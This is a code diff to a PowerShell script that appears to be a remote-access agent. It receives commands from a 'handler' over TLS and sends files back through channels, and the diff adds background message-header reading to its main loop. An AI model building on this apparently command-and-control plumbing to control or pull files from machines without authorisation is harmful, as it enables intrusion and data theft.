@@ -19,6 +19,7 @@ function Handle-Message([PSObject] $transport, [PSObject] $msg) {
 	        $filenamelen = ($msg.leng) - 2
             $filename = New-Object String($msg.content, 2, $filenamelen)
             Command-SendFile $downloadchannelid $filename $transport
+            return $true
         } elseif ($msg.mtype -eq $MESSAGE_TYPE_EOC) {
             Write-Host '[-] ERROR: received close message from handler, exiting...'
             Channel-setClosed $Channels[$MESSAGE_CHANNEL_COMMAND]
@@ -97,6 +98,56 @@ function Command-SendFile([UInt16] $downloadchannelid, [string] $filename, [PSOb
     #$done = $job.AsyncWaitHandle.WaitOne()
     #$p.EndInvoke($job)
     #Write-Host $Channels[$downloadchannelid].sendqueue.Count
+
+    # TODO: return $asyncobj as below and add it to a list of concurrent jobs
+    # TODO: terminate these jobs on exit
+}
+
+function ReceiveHeader-Async-Start([PSObject] $transport) {
+
+    $script = {
+        param([UInt32]$messageheaderlen, [PSObject]$transport)
+
+        # This is a copy of the Transport-Tls-Receive function
+        $numb = 0
+	    $buffer = New-Object byte[]($messageheaderlen)
+	    while ($numb -lt $messageheaderlen) {
+		    $numb += $transport.reader.Read($buffer, $numb, $messageheaderlen-$numb)
+	    }
+
+	    # TODO: add other transport modes!
+
+	    return $buffer
+    }
+
+    $p = [PowerShell]::Create()
+    $null = $p.AddScript($script).AddArgument($MESSAGE_HEADER_LEN).AddArgument($transport)
+    $job = $p.BeginInvoke()
+    Write-Host "DEBUG: started backgroud receive header process"
+
+    #Write-Host $Channels[$downloadchannelid].sendqueue.Count
+    #$done = $job.AsyncWaitHandle.WaitOne()
+    #$p.EndInvoke($job)
+    #Write-Host $Channels[$downloadchannelid].sendqueue.Count
+
+    return New-Object -TypeName PSObject -Property @{
+       'shell' = $p
+       'job' = $job
+    }
+
+}
+
+function ReceiveHeader-Async-IsDone([PSObject] $asyncobj) {
+
+    return $asyncobj.job.IsCompleted
+
+}
+
+function ReceiveHeader-Async-GetResult([PSObject] $asyncobj) {
+
+    Write-Host "DEBUG: ended backgroud receive header process"
+    return $asyncobj.shell.EndInvoke($asyncobj.job)
+
 }
 
 
@@ -158,17 +209,37 @@ Message-SendToTransport $message1 $transport
 #Write-Host "DEBUG: send hello to handler"
 
 # wait for command
-$res = Message-ParseFromTransport $transport
-$res = Handle-Message $transport $res
+#$res = Message-ParseFromTransport $transport
+#$res = Handle-Message $transport $res
 
-# send data
+# try to read message headers in the background
+$asyncobj = ReceiveHeader-Async-Start $transport
+
+# main loop to send and receive data
 while (Channel-isOpen $Channels[$MESSAGE_CHANNEL_COMMAND]) {
+
+    # try to read a message from the handler
+    while ( ReceiveHeader-Async-IsDone $asyncobj ) {
+        # receive result of the async job
+        $messageheaders = ReceiveHeader-Async-GetResult $asyncobj
+
+        # receive full message object and handle it
+        $msg = Message-ParseFromTransport $transport $messageheaders
+        $res = Handle-Message $transport $msg
+        # TODO: report error on $res -eq $false
+
+        # and try to read the next one
+        $asyncobj = ReceiveHeader-Async-Start $transport
+    }
 
     # store list of channels that can be closed now
     $channelstoremove = @{ }
 
     # send data for each channel
     foreach ($chanid in $Channels.Keys) {
+        if ($chanid -eq $MESSAGE_CHANNEL_COMMAND) {
+            continue  # the command channel is different still
+        }
         if (Channel-HasDataToSend($Channels[$chanid])) {
             Write-Host "DEBUG: sending data"
             $data = Channel-ReadToSend $Channels[$chanid] $MESSAGE_MAX_DATA_LEN
@@ -188,6 +259,9 @@ while (Channel-isOpen $Channels[$MESSAGE_CHANNEL_COMMAND]) {
     }
 
 }
+
+# TODO: stop all jobs! TEST!
+$asyncobj.shell.Stop()
 
 
 if ($CHANNELENCRYPTION -eq "TLS") {
